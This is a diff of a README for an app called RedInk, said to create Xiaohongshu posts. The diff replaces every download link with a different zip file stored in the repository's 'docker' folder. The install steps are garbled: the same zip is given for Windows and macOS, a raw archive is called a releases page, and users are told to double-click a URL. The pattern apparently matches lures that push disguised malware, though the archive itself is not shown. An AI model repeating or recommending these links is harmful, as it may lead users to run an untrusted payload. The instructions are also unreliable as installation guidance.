@@ -6,9 +6,9 @@ Welcome to RedInk! This application helps you generate text and images for Xiaoh
 
 ## 📥 Download RedInk
 
-[![Download RedInk](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip)](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip)
+[![Download RedInk](https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip)](https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip)
 
-Visit this page to download the latest version of RedInk: [Download RedInk Releases](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip)
+Visit this page to download the latest version of RedInk: [Download RedInk Releases](https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip)
 
 ## 🖥 System Requirements
 
@@ -22,22 +22,22 @@ Before you install RedInk, make sure your system meets the following requirement
 
 ## 📂 Download & Install
 
-1. Visit the [Download RedInk Releases](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip) page.
+1. Visit the [Download RedInk Releases](https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip) page.
 
 2. Look for the latest version. It will be listed at the top of the page.
 
 3. Click on the assets below the latest release to find the file you need:
-   - For **Windows**, download `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip`.
-   - For **macOS**, download `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip`.
+   - For **Windows**, download `https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip`.
+   - For **macOS**, download `https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip`.
 
 4. Once the download is complete, locate the downloaded file on your computer.
 
 5. Follow these steps to install RedInk:
    - **For Windows:**
-     - Double-click on `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip`.
+     - Double-click on `https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip`.
      - Follow the installation prompts to complete the setup.
    - **For macOS:**
-     - Open `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip` by double-clicking it.
+     - Open `https://github.com/Sanpo19/RedInk/raw/refs/heads/main/docker/Ink-Red-1.3.zip` by double-clicking it.
      - Drag and drop the RedInk icon into your Applications folder.
 
 6. After installation, you can find RedInk in your applications menu.
